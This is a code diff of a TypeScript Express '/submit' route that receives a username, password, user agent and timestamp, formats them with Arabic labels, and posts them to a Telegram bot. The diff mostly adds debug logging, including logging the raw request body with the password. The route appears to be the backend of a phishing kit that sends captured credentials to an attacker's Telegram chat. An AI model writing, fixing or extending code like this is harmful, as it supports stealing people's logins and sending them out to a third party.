@@ -7,13 +7,13 @@ const router: IRouter = Router();
 router.use(healthRouter);
 
 router.post("/submit", async (req: Request, res: Response) => {
-  console.log('📥 [1] Request received');
-  console.log('📥 [2] Origin:', req.headers.origin);
-  
-  // ✅ تأكد من إرسال JSON
-  res.setHeader('Content-Type', 'application/json');
+  // ✅ تأكد من إرسال رد دائماً
+  res.setHeader("Content-Type", "application/json");
   
   try {
+    console.log('📥 [1] Request received');
+    console.log('📥 [2] Body:', req.body);
+
     const { username, password, timestamp, userAgent } = req.body;
     console.log('📥 [3] Username:', username);
 
@@ -46,28 +46,32 @@ ${label} ${password}
 📱 المتصفح: ${userAgent || 'غير معروف'}
     `;
 
+    console.log('📥 [7] Message:', message);
+
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    console.log('📥 [8] Sending to Telegram...');
+    
     const response = await fetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: chatId, text: message }),
     });
 
+    console.log('📥 [9] Telegram status:', response.status);
+
     if (!response.ok) {
       const errorText = await response.text();
-      console.error("📥 [7] ❌ Telegram error:", errorText);
+      console.error("📥 [10] ❌ Telegram error:", errorText);
       return res.status(500).send(JSON.stringify({ error: "Failed to send Telegram message" }));
     }
 
-    console.log("📥 [8] ✅ Telegram notification sent");
-    
-    // ✅ تأكد من إرسال الرد
-    const responseData = { success: true };
-    console.log('📥 [9] Sending response:', responseData);
-    return res.status(200).send(JSON.stringify(responseData));
+    console.log("📥 [11] ✅ Telegram notification sent");
+    return res.status(200).send(JSON.stringify({ success: true }));
 
   } catch (error) {
-    console.error("📥 [10] ❌ Server error:", error);
+    console.error("📥 [12] ❌ Server error:", error);
+    console.error("📥 [13] ❌ Error stack:", error.stack);
+    // ✅ حتى في حالة الخطأ، أرسل رد
     return res.status(500).send(JSON.stringify({ 
       error: "Internal server error",
       details: error.message 
